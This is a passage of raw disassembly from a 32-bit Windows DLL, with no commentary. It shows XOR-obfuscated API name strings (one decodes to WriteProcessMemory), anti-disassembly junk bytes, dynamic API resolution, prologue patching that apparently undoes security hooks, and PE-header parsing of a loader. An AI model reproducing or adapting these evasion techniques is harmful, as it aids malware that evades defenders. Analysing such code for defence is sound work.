10007fe2:	e8 56 f3 ff ff       	call   0x1000733d
10007fe7:	59                   	pop    %ecx
10007fe8:	50                   	push   %eax
10007fe9:	ff 75 18             	push   0x18(%ebp)
10007fec:	ff 75 14             	push   0x14(%ebp)
10007fef:	e8 fe f2 ff ff       	call   0x100072f2
10007ff4:	83 c4 0c             	add    $0xc,%esp
10007ff7:	89 85 c4 fc ff ff    	mov    %eax,-0x33c(%ebp)
10007ffd:	e8 2b f3 ff ff       	call   0x1000732d
10008002:	31 2e                	xor    %ebp,(%esi)
10008004:	f4                   	hlt
10008005:	54                   	push   %esp
10008006:	68 04 01 00 00       	push   $0x104
1000800b:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
10008011:	50                   	push   %eax
10008012:	ff 75 08             	push   0x8(%ebp)
10008015:	ff 95 c8 fa ff ff    	call   *-0x538(%ebp)
1000801b:	89 85 68 fc ff ff    	mov    %eax,-0x398(%ebp)
10008021:	c6 85 bc fa ff ff 01 	movb   $0x1,-0x544(%ebp)
10008028:	83 bd 68 fc ff ff 00 	cmpl   $0x0,-0x398(%ebp)
1000802f:	74 17                	je     0x10008048
10008031:	83 bd 68 fc ff ff 00 	cmpl   $0x0,-0x398(%ebp)
10008038:	0f 84 b9 01 00 00    	je     0x100081f7
1000803e:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
10008042:	0f 84 af 01 00 00    	je     0x100081f7
10008048:	83 7d 0c 08          	cmpl   $0x8,0xc(%ebp)
1000804c:	0f 85 76 01 00 00    	jne    0x100081c8
10008052:	80 a5 48 f9 ff ff 00 	andb   $0x0,-0x6b8(%ebp)
10008059:	80 a5 49 f9 ff ff 00 	andb   $0x0,-0x6b7(%ebp)
10008060:	c6 85 4a f9 ff ff 4e 	movb   $0x4e,-0x6b6(%ebp)
10008067:	80 a5 4b f9 ff ff 00 	andb   $0x0,-0x6b5(%ebp)
1000806e:	c6 85 4c f9 ff ff e6 	movb   $0xe6,-0x6b4(%ebp)
10008075:	c6 85 4d f9 ff ff c3 	movb   $0xc3,-0x6b3(%ebp)
1000807c:	c6 85 4e f9 ff ff d8 	movb   $0xd8,-0x6b2(%ebp)
10008083:	c6 85 4f f9 ff ff c5 	movb   $0xc5,-0x6b1(%ebp)
1000808a:	c6 85 50 f9 ff ff d4 	movb   $0xd4,-0x6b0(%ebp)
10008091:	c6 85 51 f9 ff ff e1 	movb   $0xe1,-0x6af(%ebp)
10008098:	c6 85 52 f9 ff ff c3 	movb   $0xc3,-0x6ae(%ebp)
1000809f:	c6 85 53 f9 ff ff de 	movb   $0xde,-0x6ad(%ebp)
100080a6:	c6 85 54 f9 ff ff d2 	movb   $0xd2,-0x6ac(%ebp)
100080ad:	c6 85 55 f9 ff ff d4 	movb   $0xd4,-0x6ab(%ebp)
100080b4:	c6 85 56 f9 ff ff c2 	movb   $0xc2,-0x6aa(%ebp)
100080bb:	c6 85 57 f9 ff ff c2 	movb   $0xc2,-0x6a9(%ebp)
100080c2:	c6 85 58 f9 ff ff fc 	movb   $0xfc,-0x6a8(%ebp)
100080c9:	c6 85 59 f9 ff ff d4 	movb   $0xd4,-0x6a7(%ebp)
100080d0:	c6 85 5a f9 ff ff dc 	movb   $0xdc,-0x6a6(%ebp)
100080d7:	c6 85 5b f9 ff ff de 	movb   $0xde,-0x6a5(%ebp)
100080de:	c6 85 5c f9 ff ff c3 	movb   $0xc3,-0x6a4(%ebp)
100080e5:	c6 85 5d f9 ff ff c8 	movb   $0xc8,-0x6a3(%ebp)
100080ec:	c6 85 5e f9 ff ff b1 	movb   $0xb1,-0x6a2(%ebp)
100080f3:	8d 85 48 f9 ff ff    	lea    -0x6b8(%ebp),%eax
100080f9:	50                   	push   %eax
100080fa:	e8 3e f2 ff ff       	call   0x1000733d
100080ff:	59                   	pop    %ecx
10008100:	50                   	push   %eax
10008101:	ff 75 18             	push   0x18(%ebp)
10008104:	ff 75 14             	push   0x14(%ebp)
10008107:	e8 e6 f1 ff ff       	call   0x100072f2
1000810c:	83 c4 0c             	add    $0xc,%esp
1000810f:	89 85 70 f9 ff ff    	mov    %eax,-0x690(%ebp)
10008115:	c6 85 60 f9 ff ff 8b 	movb   $0x8b,-0x6a0(%ebp)
1000811c:	80 8d 61 f9 ff ff ff 	orb    $0xff,-0x69f(%ebp)
10008123:	c6 85 62 f9 ff ff 55 	movb   $0x55,-0x69e(%ebp)
1000812a:	c6 85 63 f9 ff ff 8b 	movb   $0x8b,-0x69d(%ebp)
10008131:	c6 85 64 f9 ff ff ec 	movb   $0xec,-0x69c(%ebp)
10008138:	8d 85 6c f9 ff ff    	lea    -0x694(%ebp),%eax
1000813e:	50                   	push   %eax
1000813f:	6a 05                	push   $0x5
10008141:	8d 85 60 f9 ff ff    	lea    -0x6a0(%ebp),%eax
10008147:	50                   	push   %eax
10008148:	ff b5 c4 fc ff ff    	push   -0x33c(%ebp)
1000814e:	6a ff                	push   $0xffffffff
10008150:	ff 95 70 f9 ff ff    	call   *-0x690(%ebp)
10008156:	8b 45 08             	mov    0x8(%ebp),%eax
10008159:	89 85 40 f9 ff ff    	mov    %eax,-0x6c0(%ebp)
1000815f:	8b 45 10             	mov    0x10(%ebp),%eax
10008162:	89 85 44 f9 ff ff    	mov    %eax,-0x6bc(%ebp)
10008168:	68 00 10 00 00       	push   $0x1000
1000816d:	6a 08                	push   $0x8
1000816f:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
10008175:	ff 95 84 f9 ff ff    	call   *-0x67c(%ebp)
1000817b:	89 85 68 f9 ff ff    	mov    %eax,-0x698(%ebp)
10008181:	ff b5 68 f9 ff ff    	push   -0x698(%ebp)
10008187:	8d 85 40 f9 ff ff    	lea    -0x6c0(%ebp),%eax
1000818d:	50                   	push   %eax
1000818e:	ff 75 08             	push   0x8(%ebp)
10008191:	ff 75 18             	push   0x18(%ebp)
10008194:	ff 75 14             	push   0x14(%ebp)
10008197:	e8 54 f3 ff ff       	call   0x100074f0
1000819c:	83 c4 14             	add    $0x14,%esp
1000819f:	ff b5 68 f9 ff ff    	push   -0x698(%ebp)
100081a5:	6a 01                	push   $0x1
100081a7:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
100081ad:	ff 95 64 fc ff ff    	call   *-0x39c(%ebp)
100081b3:	8b 85 c4 fc ff ff    	mov    -0x33c(%ebp),%eax
100081b9:	8b 65 1c             	mov    0x1c(%ebp),%esp
100081bc:	89 44 24 fc          	mov    %eax,-0x4(%esp)
100081c0:	61                   	popa
100081c1:	83 c4 14             	add    $0x14,%esp
100081c4:	ff 64 24 c8          	jmp    *-0x38(%esp)
100081c8:	80 a5 bc fa ff ff 00 	andb   $0x0,-0x544(%ebp)
100081cf:	e8 59 f1 ff ff       	call   0x1000732d
100081d4:	11 24 c9             	adc    %esp,(%ecx,%ecx,8)
100081d7:	df 6a 00             	fildll 0x0(%edx)
100081da:	ff 95 c0 fc ff ff    	call   *-0x340(%ebp)
100081e0:	89 45 08             	mov    %eax,0x8(%ebp)
100081e3:	68 04 01 00 00       	push   $0x104
100081e8:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
100081ee:	50                   	push   %eax
100081ef:	6a 00                	push   $0x0
100081f1:	ff 95 c8 fa ff ff    	call   *-0x538(%ebp)
100081f7:	80 a5 d0 fd ff ff 00 	andb   $0x0,-0x230(%ebp)
100081fe:	6a 40                	push   $0x40
10008200:	59                   	pop    %ecx
10008201:	33 c0                	xor    %eax,%eax
10008203:	8d bd d1 fd ff ff    	lea    -0x22f(%ebp),%edi
10008209:	f3 ab                	rep stos %eax,%es:(%edi)
1000820b:	66 ab                	stos   %ax,%es:(%edi)
1000820d:	aa                   	stos   %al,%es:(%edi)
1000820e:	80 a5 d4 fe ff ff 00 	andb   $0x0,-0x12c(%ebp)
10008215:	6a 40                	push   $0x40
10008217:	59                   	pop    %ecx
10008218:	33 c0                	xor    %eax,%eax
1000821a:	8d bd d5 fe ff ff    	lea    -0x12b(%ebp),%edi
10008220:	f3 ab                	rep stos %eax,%es:(%edi)
10008222:	66 ab                	stos   %ax,%es:(%edi)
10008224:	aa                   	stos   %al,%es:(%edi)
10008225:	80 a5 ac f9 ff ff 00 	andb   $0x0,-0x654(%ebp)
1000822c:	6a 40                	push   $0x40
1000822e:	59                   	pop    %ecx
1000822f:	33 c0                	xor    %eax,%eax
10008231:	8d bd ad f9 ff ff    	lea    -0x653(%ebp),%edi
10008237:	f3 ab                	rep stos %eax,%es:(%edi)
10008239:	66 ab                	stos   %ax,%es:(%edi)
1000823b:	aa                   	stos   %al,%es:(%edi)
1000823c:	80 a5 fc fa ff ff 00 	andb   $0x0,-0x504(%ebp)
10008243:	6a 40                	push   $0x40
10008245:	59                   	pop    %ecx
10008246:	33 c0                	xor    %eax,%eax
10008248:	8d bd fd fa ff ff    	lea    -0x503(%ebp),%edi
1000824e:	f3 ab                	rep stos %eax,%es:(%edi)
10008250:	66 ab                	stos   %ax,%es:(%edi)
10008252:	aa                   	stos   %al,%es:(%edi)
10008253:	e8 b3 f0 ff ff       	call   0x1000730b
10008258:	99                   	cltd
10008259:	f6 c6 45             	test   $0x45,%dh
1000825c:	f8                   	clc
1000825d:	2f                   	das
1000825e:	c6 45 dc 34          	movb   $0x34,-0x24(%ebp)
10008262:	80 a5 94 fc ff ff 00 	andb   $0x0,-0x36c(%ebp)
10008269:	80 a5 95 fc ff ff 00 	andb   $0x0,-0x36b(%ebp)
10008270:	c6 85 96 fc ff ff 6c 	movb   $0x6c,-0x36a(%ebp)
10008277:	80 a5 97 fc ff ff 00 	andb   $0x0,-0x369(%ebp)
1000827e:	c6 85 98 fc ff ff d4 	movb   $0xd4,-0x368(%ebp)
10008285:	c6 85 99 fc ff ff f6 	movb   $0xf6,-0x367(%ebp)
1000828c:	c6 85 9a fc ff ff e7 	movb   $0xe7,-0x366(%ebp)
10008293:	c6 85 9b fc ff ff c0 	movb   $0xc0,-0x365(%ebp)
1000829a:	c6 85 9c fc ff ff ea 	movb   $0xea,-0x364(%ebp)
100082a1:	c6 85 9d fc ff ff e0 	movb   $0xe0,-0x363(%ebp)
100082a8:	c6 85 9e fc ff ff e7 	movb   $0xe7,-0x362(%ebp)
100082af:	c6 85 9f fc ff ff f6 	movb   $0xf6,-0x361(%ebp)
100082b6:	c6 85 a0 fc ff ff fe 	movb   $0xfe,-0x360(%ebp)
100082bd:	c6 85 a1 fc ff ff d7 	movb   $0xd7,-0x35f(%ebp)
100082c4:	c6 85 a2 fc ff ff fa 	movb   $0xfa,-0x35e(%ebp)
100082cb:	c6 85 a3 fc ff ff e1 	movb   $0xe1,-0x35d(%ebp)
100082d2:	c6 85 a4 fc ff ff f6 	movb   $0xf6,-0x35c(%ebp)
100082d9:	c6 85 a5 fc ff ff f0 	movb   $0xf0,-0x35b(%ebp)
100082e0:	c6 85 a6 fc ff ff e7 	movb   $0xe7,-0x35a(%ebp)
100082e7:	c6 85 a7 fc ff ff fc 	movb   $0xfc,-0x359(%ebp)
100082ee:	c6 85 a8 fc ff ff e1 	movb   $0xe1,-0x358(%ebp)
100082f5:	c6 85 a9 fc ff ff ea 	movb   $0xea,-0x357(%ebp)
100082fc:	c6 85 aa fc ff ff d2 	movb   $0xd2,-0x356(%ebp)
10008303:	c6 85 ab fc ff ff 93 	movb   $0x93,-0x355(%ebp)
1000830a:	e8 1e f0 ff ff       	call   0x1000732d
1000830f:	62 ac 2e 4a 8d 85 94 	bound  %ebp,-0x6b7a72b6(%esi,%ebp,1)
10008316:	fc                   	cld
10008317:	ff                   	(bad)
10008318:	ff 50 e8             	call   *-0x18(%eax)
1000831b:	1e                   	push   %ds
1000831c:	f0 ff                	lock (bad)
1000831e:	ff 59 50             	lcall  *0x50(%ecx)
10008321:	ff 75 18             	push   0x18(%ebp)
10008324:	ff 75 14             	push   0x14(%ebp)
10008327:	e8 c6 ef ff ff       	call   0x100072f2
1000832c:	83 c4 0c             	add    $0xc,%esp
1000832f:	89 85 2c fc ff ff    	mov    %eax,-0x3d4(%ebp)
10008335:	68 04 01 00 00       	push   $0x104
1000833a:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
10008340:	50                   	push   %eax
10008341:	ff 95 2c fc ff ff    	call   *-0x3d4(%ebp)
10008347:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000834a:	80 65 e0 00          	andb   $0x0,-0x20(%ebp)
1000834e:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
10008352:	c6 45 e2 75          	movb   $0x75,-0x1e(%ebp)
10008356:	80 65 e3 00          	andb   $0x0,-0x1d(%ebp)
1000835a:	c6 45 e4 cd          	movb   $0xcd,-0x1c(%ebp)
1000835e:	c6 45 e5 ef          	movb   $0xef,-0x1b(%ebp)
10008362:	c6 45 e6 fe          	movb   $0xfe,-0x1a(%ebp)
10008366:	c6 45 e7 de          	movb   $0xde,-0x19(%ebp)
1000836a:	c6 45 e8 ef          	movb   $0xef,-0x18(%ebp)
1000836e:	c6 45 e9 e7          	movb   $0xe7,-0x17(%ebp)
10008372:	c6 45 ea fa          	movb   $0xfa,-0x16(%ebp)
10008376:	c6 45 eb da          	movb   $0xda,-0x15(%ebp)
1000837a:	c6 45 ec eb          	movb   $0xeb,-0x14(%ebp)
1000837e:	c6 45 ed fe          	movb   $0xfe,-0x13(%ebp)
10008382:	c6 45 ee e2          	movb   $0xe2,-0x12(%ebp)
10008386:	c6 45 ef cb          	movb   $0xcb,-0x11(%ebp)
1000838a:	c6 45 f0 8a          	movb   $0x8a,-0x10(%ebp)
1000838e:	8d 45 e0             	lea    -0x20(%ebp),%eax
10008391:	50                   	push   %eax
10008392:	e8 a6 ef ff ff       	call   0x1000733d
10008397:	59                   	pop    %ecx
10008398:	50                   	push   %eax
10008399:	ff 75 18             	push   0x18(%ebp)
1000839c:	ff 75 14             	push   0x14(%ebp)
1000839f:	e8 4e ef ff ff       	call   0x100072f2
100083a4:	83 c4 0c             	add    $0xc,%esp
100083a7:	89 85 90 fc ff ff    	mov    %eax,-0x370(%ebp)
100083ad:	e8 7b ef ff ff       	call   0x1000732d
100083b2:	86 84 92 24 8d 85 ac 	xchg   %al,-0x537a72dc(%edx,%edx,4)
100083b9:	f9                   	stc
100083ba:	ff                   	(bad)
100083bb:	ff 50 68             	call   *0x68(%eax)
100083be:	04 01                	add    $0x1,%al
100083c0:	00 00                	add    %al,(%eax)
100083c2:	ff 95 90 fc ff ff    	call   *-0x370(%ebp)
100083c8:	89 85 b0 fa ff ff    	mov    %eax,-0x550(%ebp)
100083ce:	8b 45 d8             	mov    -0x28(%ebp),%eax
100083d1:	0f be 84 05 d3 fe ff 	movsbl -0x12d(%ebp,%eax,1),%eax
100083d8:	ff 
100083d9:	83 f8 5c             	cmp    $0x5c,%eax
100083dc:	75 07                	jne    0x100083e5
100083de:	8b 45 d8             	mov    -0x28(%ebp),%eax
100083e1:	48                   	dec    %eax
100083e2:	89 45 d8             	mov    %eax,-0x28(%ebp)
100083e5:	8b 85 b0 fa ff ff    	mov    -0x550(%ebp),%eax
100083eb:	0f be 84 05 ab f9 ff 	movsbl -0x655(%ebp,%eax,1),%eax
100083f2:	ff 
100083f3:	83 f8 5c             	cmp    $0x5c,%eax
100083f6:	75 0d                	jne    0x10008405
100083f8:	8b 85 b0 fa ff ff    	mov    -0x550(%ebp),%eax
100083fe:	48                   	dec    %eax
100083ff:	89 85 b0 fa ff ff    	mov    %eax,-0x550(%ebp)
10008405:	83 a5 c8 fc ff ff 00 	andl   $0x0,-0x338(%ebp)
1000840c:	83 a5 30 fc ff ff 00 	andl   $0x0,-0x3d0(%ebp)
10008413:	eb 0d                	jmp    0x10008422
10008415:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
1000841b:	40                   	inc    %eax
1000841c:	89 85 30 fc ff ff    	mov    %eax,-0x3d0(%ebp)
10008422:	81 bd 30 fc ff ff 04 	cmpl   $0x104,-0x3d0(%ebp)
10008429:	01 00 00 
1000842c:	7d 5b                	jge    0x10008489
1000842e:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
10008434:	0f be 84 05 cc fc ff 	movsbl -0x334(%ebp,%eax,1),%eax
1000843b:	ff 
1000843c:	25 80 00 00 00       	and    $0x80,%eax
10008441:	85 c0                	test   %eax,%eax
10008443:	74 0f                	je     0x10008454
10008445:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
1000844b:	40                   	inc    %eax
1000844c:	89 85 30 fc ff ff    	mov    %eax,-0x3d0(%ebp)
10008452:	eb 33                	jmp    0x10008487
10008454:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
1000845a:	0f be 84 05 cc fc ff 	movsbl -0x334(%ebp,%eax,1),%eax
10008461:	ff 
10008462:	83 f8 5c             	cmp    $0x5c,%eax
10008465:	75 0c                	jne    0x10008473
10008467:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
1000846d:	89 85 c8 fc ff ff    	mov    %eax,-0x338(%ebp)
10008473:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
10008479:	0f be 84 05 cc fc ff 	movsbl -0x334(%ebp,%eax,1),%eax
10008480:	ff 
10008481:	85 c0                	test   %eax,%eax
10008483:	75 02                	jne    0x10008487
10008485:	eb 02                	jmp    0x10008489
10008487:	eb 8c                	jmp    0x10008415
10008489:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
1000848f:	03 85 7c fc ff ff    	add    -0x384(%ebp),%eax
10008495:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
1000849b:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
100084a1:	40                   	inc    %eax
100084a2:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
100084a8:	ff b5 c8 fc ff ff    	push   -0x338(%ebp)
100084ae:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
100084b4:	50                   	push   %eax
100084b5:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
100084bb:	50                   	push   %eax
100084bc:	e8 dd ed ff ff       	call   0x1000729e
100084c1:	83 c4 0c             	add    $0xc,%esp
100084c4:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
100084ca:	40                   	inc    %eax
100084cb:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
100084d1:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
100084d7:	40                   	inc    %eax
100084d8:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
100084de:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100084e2:	83 a5 60 fc ff ff 00 	andl   $0x0,-0x3a0(%ebp)
100084e9:	83 a5 84 fc ff ff 00 	andl   $0x0,-0x37c(%ebp)
100084f0:	83 a5 78 fc ff ff 00 	andl   $0x0,-0x388(%ebp)
100084f7:	83 a5 8c fc ff ff 00 	andl   $0x0,-0x374(%ebp)
100084fe:	8a 45 f8             	mov    -0x8(%ebp),%al
10008501:	02 85 90 f9 ff ff    	add    -0x670(%ebp),%al
10008507:	88 45 f8             	mov    %al,-0x8(%ebp)
1000850a:	8b 45 08             	mov    0x8(%ebp),%eax
1000850d:	89 85 b8 fa ff ff    	mov    %eax,-0x548(%ebp)
10008513:	8b 85 b8 fa ff ff    	mov    -0x548(%ebp),%eax
10008519:	8b 8d b8 fa ff ff    	mov    -0x548(%ebp),%ecx
1000851f:	03 48 3c             	add    0x3c(%eax),%ecx
10008522:	89 8d c4 fa ff ff    	mov    %ecx,-0x53c(%ebp)
10008528:	8b 85 c4 fa ff ff    	mov    -0x53c(%ebp),%eax
1000852e:	8b 4d 08             	mov    0x8(%ebp),%ecx
10008531:	03 48 28             	add    0x28(%eax),%ecx
10008534:	89 8d 58 fc ff ff    	mov    %ecx,-0x3a8(%ebp)
1000853a:	8a 45 dc             	mov    -0x24(%ebp),%al
1000853d:	2a 85 90 f9 ff ff    	sub    -0x670(%ebp),%al
10008543:	88 45 dc             	mov    %al,-0x24(%ebp)
10008546:	e8 c0 ed ff ff       	call   0x1000730b
1000854b:	0a a5 80 a5 04 fc    	or     -0x3fb5a80(%ebp),%ah
10008551:	ff                   	(bad)
10008552:	ff 00                	incl   (%eax)
10008554:	80 a5 05 fc ff ff 00 	andb   $0x0,-0x3fb(%ebp)
1000855b:	c6 85 06 fc ff ff b1 	movb   $0xb1,-0x3fa(%ebp)
10008562:	80 a5 07 fc ff ff 00 	andb   $0x0,-0x3f9(%ebp)
10008569:	c6 85 08 fc ff ff 0d 	movb   $0xd,-0x3f8(%ebp)
10008570:	c6 85 09 fc ff ff 3c 	movb   $0x3c,-0x3f7(%ebp)
10008577:	c6 85 0a fc ff ff 2b 	movb   $0x2b,-0x3f6(%ebp)
1000857e:	c6 85 0b fc ff ff 2f 	movb   $0x2f,-0x3f5(%ebp)
10008585:	c6 85 0c fc ff ff 3a 	movb   $0x3a,-0x3f4(%ebp)
1000858c:	c6 85 0d fc ff ff 2b 	movb   $0x2b,-0x3f3(%ebp)
10008593:	c6 85 0e fc ff ff 08 	movb   $0x8,-0x3f2(%ebp)
1000859a:	c6 85 0f fc ff ff 27 	movb   $0x27,-0x3f1(%ebp)
100085a1:	c6 85 10 fc ff ff 22 	movb   $0x22,-0x3f0(%ebp)
100085a8:	c6 85 11 fc ff ff 2b 	movb   $0x2b,-0x3ef(%ebp)
100085af:	c6 85 12 fc ff ff 0f 	movb   $0xf,-0x3ee(%ebp)
100085b6:	c6 85 13 fc ff ff 4e 	movb   $0x4e,-0x3ed(%ebp)
100085bd:	e8 6b ed ff ff       	call   0x1000732d
100085c2:	fc                   	cld
100085c3:	d4 c4                	aam    $0xc4
100085c5:	e8 8d 85 04 fc       	call   0xc050b57
100085ca:	ff                   	(bad)
100085cb:	ff 50 e8             	call   *-0x18(%eax)
100085ce:	6b ed ff             	imul   $0xffffffff,%ebp,%ebp
100085d1:	ff 59 50             	lcall  *0x50(%ecx)
100085d4:	ff 75 18             	push   0x18(%ebp)
100085d7:	ff 75 14             	push   0x14(%ebp)
100085da:	e8 13 ed ff ff       	call   0x100072f2
100085df:	83 c4 0c             	add    $0xc,%esp
100085e2:	89 85 38 fc ff ff    	mov    %eax,-0x3c8(%ebp)
100085e8:	6a 00                	push   $0x0
100085ea:	68 80 00 00 00       	push   $0x80
100085ef:	6a 03                	push   $0x3
100085f1:	6a 00                	push   $0x0
100085f3:	6a 01                	push   $0x1
100085f5:	68 00 00 00 80       	push   $0x80000000
100085fa:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
10008600:	50                   	push   %eax
10008601:	ff 95 38 fc ff ff    	call   *-0x3c8(%ebp)
10008607:	89 85 94 f9 ff ff    	mov    %eax,-0x66c(%ebp)
1000860d:	83 bd 94 f9 ff ff ff 	cmpl   $0xffffffff,-0x66c(%ebp)
10008614:	0f 84 a9 0e 00 00    	je     0x100094c3
1000861a:	6a 00                	push   $0x0
1000861c:	ff b5 94 f9 ff ff    	push   -0x66c(%ebp)
10008622:	ff 95 c4 fc ff ff    	call   *-0x33c(%ebp)
10008628:	89 85 88 fc ff ff    	mov    %eax,-0x378(%ebp)
1000862e:	ff b5 88 fc ff ff    	push   -0x378(%ebp)
10008634:	6a 08                	push   $0x8
10008636:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
1000863c:	ff 95 84 f9 ff ff    	call   *-0x67c(%ebp)
10008642:	89 45 fc             	mov    %eax,-0x4(%ebp)
10008645:	80 a5 24 f9 ff ff 00 	andb   $0x0,-0x6dc(%ebp)
1000864c:	80 a5 25 f9 ff ff 00 	andb   $0x0,-0x6db(%ebp)
10008653:	c6 85 26 f9 ff ff 3b 	movb   $0x3b,-0x6da(%ebp)
1000865a:	80 a5 27 f9 ff ff 00 	andb   $0x0,-0x6d9(%ebp)
10008661:	c6 85 28 f9 ff ff 96 	movb   $0x96,-0x6d8(%ebp)
10008668:	c6 85 29 f9 ff ff a1 	movb   $0xa1,-0x6d7(%ebp)
1000866f:	c6 85 2a f9 ff ff a5 	movb   $0xa5,-0x6d6(%ebp)
10008676:	c6 85 2b f9 ff ff a0 	movb   $0xa0,-0x6d5(%ebp)
1000867d:	c6 85 2c f9 ff ff 82 	movb   $0x82,-0x6d4(%ebp)
10008684:	c6 85 2d f9 ff ff ad 	movb   $0xad,-0x6d3(%ebp)
1000868b:	c6 85 2e f9 ff ff a8 	movb   $0xa8,-0x6d2(%ebp)
10008692:	c6 85 2f f9 ff ff a1 	movb   $0xa1,-0x6d1(%ebp)
10008699:	c6 85 30 f9 ff ff c4 	movb   $0xc4,-0x6d0(%ebp)
100086a0:	e8 88 ec ff ff       	call   0x1000732d
100086a5:	53                   	push   %ebx
100086a6:	37                   	aaa
100086a7:	71 64                	jno    0x1000870d
100086a9:	8d 85 24 f9 ff ff    	lea    -0x6dc(%ebp),%eax
100086af:	50                   	push   %eax
100086b0:	e8 88 ec ff ff       	call   0x1000733d
100086b5:	59                   	pop    %ecx
100086b6:	50                   	push   %eax
100086b7:	ff 75 18             	push   0x18(%ebp)
100086ba:	ff 75 14             	push   0x14(%ebp)
100086bd:	e8 30 ec ff ff       	call   0x100072f2
100086c2:	83 c4 0c             	add    $0xc,%esp
100086c5:	89 85 38 f9 ff ff    	mov    %eax,-0x6c8(%ebp)
100086cb:	e8 5d ec ff ff       	call   0x1000732d
100086d0:	84 e4                	test   %ah,%ah
100086d2:	2b d1                	sub    %ecx,%edx
100086d4:	6a 00                	push   $0x0
100086d6:	8d 85 20 f9 ff ff    	lea    -0x6e0(%ebp),%eax
100086dc:	50                   	push   %eax
100086dd:	ff b5 88 fc ff ff    	push   -0x378(%ebp)
100086e3:	ff 75 fc             	push   -0x4(%ebp)
100086e6:	ff b5 94 f9 ff ff    	push   -0x66c(%ebp)
100086ec:	ff 95 38 f9 ff ff    	call   *-0x6c8(%ebp)
100086f2:	89 85 34 f9 ff ff    	mov    %eax,-0x6cc(%ebp)
100086f8:	ff b5 94 f9 ff ff    	push   -0x66c(%ebp)
100086fe:	ff 95 80 f9 ff ff    	call   *-0x680(%ebp)
10008704:	83 bd 34 f9 ff ff 00 	cmpl   $0x0,-0x6cc(%ebp)
1000870b:	0f 84 b2 0d 00 00    	je     0x100094c3
10008711:	6a 05                	push   $0x5
10008713:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
10008719:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000871c:	8d 44 01 e3          	lea    -0x1d(%ecx,%eax,1),%eax
10008720:	50                   	push   %eax
10008721:	8d 85 6c fc ff ff    	lea    -0x394(%ebp),%eax
10008727:	50                   	push   %eax
10008728:	e8 71 eb ff ff       	call   0x1000729e
1000872d:	83 c4 0c             	add    $0xc,%esp
10008730:	83 a5 00 f9 ff ff 00 	andl   $0x0,-0x700(%ebp)
10008737:	eb 0d                	jmp    0x10008746
10008739:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
1000873f:	40                   	inc    %eax
10008740:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
10008746:	83 bd 00 f9 ff ff 05 	cmpl   $0x5,-0x700(%ebp)
1000874d:	7d 40                	jge    0x1000878f
1000874f:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
10008755:	0f be 84 05 6c fc ff 	movsbl -0x394(%ebp,%eax,1),%eax
1000875c:	ff 
1000875d:	0f be 4d dc          	movsbl -0x24(%ebp),%ecx
10008761:	33 c1                	xor    %ecx,%eax
10008763:	8b 8d 00 f9 ff ff    	mov    -0x700(%ebp),%ecx
10008769:	88 84 0d 6c fc ff ff 	mov    %al,-0x394(%ebp,%ecx,1)
10008770:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
10008776:	0f be 84 05 6c fc ff 	movsbl -0x394(%ebp,%eax,1),%eax
1000877d:	ff 
1000877e:	f7 d0                	not    %eax
10008780:	8b 8d 00 f9 ff ff    	mov    -0x700(%ebp),%ecx
10008786:	88 84 0d 6c fc ff ff 	mov    %al,-0x394(%ebp,%ecx,1)
1000878d:	eb aa                	jmp    0x10008739
1000878f:	80 a5 d4 f8 ff ff 00 	andb   $0x0,-0x72c(%ebp)
10008796:	80 a5 d5 f8 ff ff 00 	andb   $0x0,-0x72b(%ebp)
1000879d:	c6 85 d6 f8 ff ff 58 	movb   $0x58,-0x72a(%ebp)
100087a4:	80 a5 d7 f8 ff ff 00 	andb   $0x0,-0x729(%ebp)
100087ab:	c6 85 d8 f8 ff ff f1 	movb   $0xf1,-0x728(%ebp)
100087b2:	c6 85 d9 f8 ff ff ce 	movb   $0xce,-0x727(%ebp)
100087b9:	c6 85 da f8 ff ff d5 	movb   $0xd5,-0x726(%ebp)
100087c0:	c6 85 db f8 ff ff d3 	movb   $0xd3,-0x725(%ebp)
100087c7:	c6 85 dc f8 ff ff d2 	movb   $0xd2,-0x724(%ebp)
100087ce:	c6 85 dd f8 ff ff c6 	movb   $0xc6,-0x723(%ebp)
100087d5:	c6 85 de f8 ff ff cb 	movb   $0xcb,-0x722(%ebp)
100087dc:	c6 85 df f8 ff ff f7 	movb   $0xf7,-0x721(%ebp)
100087e3:	c6 85 e0 f8 ff ff d5 	movb   $0xd5,-0x720(%ebp)
100087ea:	c6 85 e1 f8 ff ff c8 	movb   $0xc8,-0x71f(%ebp)
100087f1:	c6 85 e2 f8 ff ff d3 	movb   $0xd3,-0x71e(%ebp)
100087f8:	c6 85 e3 f8 ff ff c2 	movb   $0xc2,-0x71d(%ebp)
100087ff:	c6 85 e4 f8 ff ff c4 	movb   $0xc4,-0x71c(%ebp)
10008806:	c6 85 e5 f8 ff ff d3 	movb   $0xd3,-0x71b(%ebp)
